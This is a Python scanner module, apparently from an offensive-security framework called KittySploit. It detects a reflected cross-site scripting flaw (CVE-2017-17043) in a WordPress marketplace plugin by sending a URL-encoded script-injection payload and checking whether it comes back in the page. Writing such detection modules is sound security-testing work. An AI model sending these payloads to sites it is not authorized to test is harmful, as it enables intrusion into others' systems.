#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Emag Marketplace Connector plugin 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Emag Marketplace Connector 1.0 - Cross-Site Scripting Detection',
        'description': 'WordPress Emag Marketplace Connector plugin 1.0 contains a reflected cross-site scripting vulnerability because the parameter "post" to /wp-content/plugins/emag-marketplace-connector/templates/order/awb-meta-box.php is not filtered correctly.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'xss', 'wp-plugin', 'packetstorm', 'wordpress', 'zitec', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wordpress.org/support/topic/wordpress-emag-marketplace-connector-1-0-cross-site-scripting-vulnerability/',
            'https://packetstormsecurity.com/files/145060/wpemagmc10-xss.txt',
            'https://wpvulndb.com/vulnerabilities/8964',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-17043',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2017-17043',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/emag-marketplace-connector/',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/emag-marketplace-connector/templates/order/awb-meta-box.php?post=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Emag Marketplace Connector 1.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

